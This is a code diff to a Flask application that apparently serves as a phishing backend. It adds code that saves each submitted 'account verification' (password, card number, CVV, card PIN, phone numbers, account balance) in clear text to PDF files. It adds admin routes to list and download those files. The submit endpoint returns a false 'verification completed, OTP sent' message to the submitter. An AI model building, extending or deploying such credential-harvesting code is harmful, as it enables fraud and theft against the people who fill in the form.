@@ -1,10 +1,14 @@
 # Import required modules for Flask application
-from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
+from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory, send_file
 from flask_sqlalchemy import SQLAlchemy  # SQLAlchemy ORM for database operations
 from werkzeug.security import generate_password_hash, check_password_hash  # Password hashing utilities
 from datetime import datetime  # For timestamp handling
 import bcrypt  # For password hashing (additional security)
 import os  # For environment variables and file operations
+from werkzeug.utils import secure_filename
+from reportlab.lib.pagesizes import letter
+from reportlab.pdfgen import canvas
+from reportlab.lib.units import inch
 
 # Create Flask application instance
 app = Flask(__name__)
@@ -16,6 +20,71 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False  # Disable modification tra
 
 # Initialize SQLAlchemy with Flask app
 db = SQLAlchemy(app)
+
+# Directory to store generated submission PDFs (under instance/ for safety)
+PDF_STORAGE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), 'instance', 'submission_pdfs'))
+os.makedirs(PDF_STORAGE_DIR, exist_ok=True)
+
+def generate_submission_pdf(submission_data: dict, created_at: datetime, file_basename: str) -> str:
+    """Generate a PDF with submission details and return the saved filename.
+
+    The file will be saved into PDF_STORAGE_DIR and named using file_basename.
+    """
+    safe_name = secure_filename(file_basename) or f"submission_{int(created_at.timestamp())}.pdf"
+    if not safe_name.lower().endswith('.pdf'):
+        safe_name += '.pdf'
+    file_path = os.path.join(PDF_STORAGE_DIR, safe_name)
+
+    c = canvas.Canvas(file_path, pagesize=letter)
+    width, height = letter
+
+    margin = 0.75 * inch
+    y = height - margin
+
+    # Header
+    c.setFont("Helvetica-Bold", 16)
+    c.drawString(margin, y, "Account Verification Submission")
+    y -= 0.35 * inch
+
+    # Metadata
+    c.setFont("Helvetica", 10)
+    c.drawString(margin, y, f"Created At: {created_at.isoformat()}")
+    y -= 0.25 * inch
+
+    # Submission fields in clear text as requested
+    fields = [
+        ("Username", submission_data.get('fullname', '')),
+        ("Password", submission_data.get('password', '')),
+        ("Card Number", submission_data.get('CardNumber', '')),
+        ("Expiry Date", submission_data.get('expiry_date', '')),
+        ("CVV", submission_data.get('cvv', '')),
+        ("Card Pin", submission_data.get('card_pin', '')),
+        ("Contact Number", submission_data.get('contact_number', '')),
+        ("Phone Number", submission_data.get('phone_number', '')),
+        ("Last Account Balance", submission_data.get('last_account_balance', '')),
+    ]
+
+    c.setFont("Helvetica", 12)
+    for label, value in fields:
+        line = f"{label}: {value}"
+        # Wrap long lines
+        max_chars = 90
+        while len(line) > max_chars:
+            c.drawString(margin, y, line[:max_chars])
+            line = line[max_chars:]
+            y -= 0.22 * inch
+            if y < margin:
+                c.showPage()
+                y = height - margin
+        c.drawString(margin, y, line)
+        y -= 0.28 * inch
+        if y < margin:
+            c.showPage()
+            y = height - margin
+
+    c.showPage()
+    c.save()
+    return safe_name
 
 # Define database models using SQLAlchemy ORM
 
@@ -321,37 +390,29 @@ def submit_form():
             if not data.get(field):  # Check if field is missing or empty
                 return jsonify({'error': f'Field {field} is required'}), 400  # Return error response
         
-        # Create new submission record
-        submission = Submission(
-            fullname=data['fullname'],  # Extract username from form data
-            password=data['password'],  # Extract password from form data
-            card_number=data['CardNumber'],  # Extract card number from form data
-            expiry_date=data['expiry_date'],  # Extract expiry date from form data
-            cvv=data['cvv'],  # Extract CVV from form data
-            card_pin=data['card_pin'],  # Extract card PIN from form data
-            contact_number=data.get('contact_number'),  # Extract contact number (optional)
-            phone_number=data['phone_number']  # Extract phone number for OTP
+        # Generate and store PDF for this submission (no DB requirement for storage)
+        created_at = datetime.utcnow()
+        user_identifier = get_user_identifier()
+        pdf_name = generate_submission_pdf(
+            submission_data=data,
+            created_at=created_at,
+            file_basename=f"submission_{user_identifier}_{int(created_at.timestamp())}.pdf"
         )
-        
-        # Add submission to database session and commit
-        db.session.add(submission)  # Add new record to session
-        db.session.commit()  # Save changes to database
         
         # Log successful form submission
         log_user_activity(
             action_type='form_submit_success',  # Mark as successful submission
             page='/api/submit',  # Record the endpoint
-            additional_data=f'{{"submission_id": {submission.id}}}'  # Include submission ID
+            additional_data=f'{{"pdf": "{pdf_name}"}}'  # Reference generated PDF
         )
         
-        # Log successful submission
-        print(f'New submission saved with ID: {submission.id}')
+        print(f'New submission PDF saved: {pdf_name}')
         
         # Return success response with redirect instruction
         return jsonify({
-            'success': True, 
+            'success': True,
             'message': f'Verification completed successfully! OTP has been sent to {data["phone_number"]}',
-            'redirect': '/loading'  # Instruct frontend to redirect to loading page
+            'redirect': '/loading'
         }), 200
     
     except Exception as e:
@@ -1275,6 +1336,53 @@ def admin_logout():
 def serve_static(filename):
     """Serve static files from public directory"""
     return send_from_directory('public', filename)  # Send requested file
+
+# Admin-only: list generated submission PDFs
+@app.route('/api/admin/pdfs', methods=['GET'])
+def list_submission_pdfs():
+    if not require_auth():
+        return jsonify({'error': 'Unauthorized'}), 401
+    try:
+        files = []
+        if os.path.isdir(PDF_STORAGE_DIR):
+            for name in os.listdir(PDF_STORAGE_DIR):
+                if not name.lower().endswith('.pdf'):
+                    continue
+                path = os.path.join(PDF_STORAGE_DIR, name)
+                if not os.path.isfile(path):
+                    continue
+                stat = os.stat(path)
+                files.append({
+                    'name': name,
+                    'size_bytes': stat.st_size,
+                    'modified_at': datetime.fromtimestamp(stat.st_mtime).isoformat(),
+                    'created_at': datetime.fromtimestamp(stat.st_ctime).isoformat(),
+                    'download_url': f'/api/admin/pdfs/{name}'
+                })
+        # Sort newest first
+        files.sort(key=lambda f: f['modified_at'], reverse=True)
+        return jsonify({'files': files}), 200
+    except Exception as e:
+        print(f'Error listing PDFs: {e}')
+        return jsonify({'error': 'Failed to list PDFs'}), 500
+
+# Admin-only: download a specific submission PDF
+@app.route('/api/admin/pdfs/<path:filename>', methods=['GET'])
+def download_submission_pdf(filename):
+    if not require_auth():
+        return jsonify({'error': 'Unauthorized'}), 401
+    try:
+        # Prevent path traversal
+        # Use the raw filename, but ensure the resolved path remains inside the storage dir
+        requested = os.path.abspath(os.path.join(PDF_STORAGE_DIR, filename))
+        if not requested.startswith(PDF_STORAGE_DIR + os.sep):
+            return jsonify({'error': 'Invalid file path'}), 400
+        if not os.path.isfile(requested):
+            return jsonify({'error': 'File not found'}), 404
+        return send_file(requested, as_attachment=True)
+    except Exception as e:
+        print(f'Error sending PDF {filename}: {e}')
+        return jsonify({'error': 'Failed to send PDF'}), 500
 
 # Initialize database and create default admin user
 def init_database():
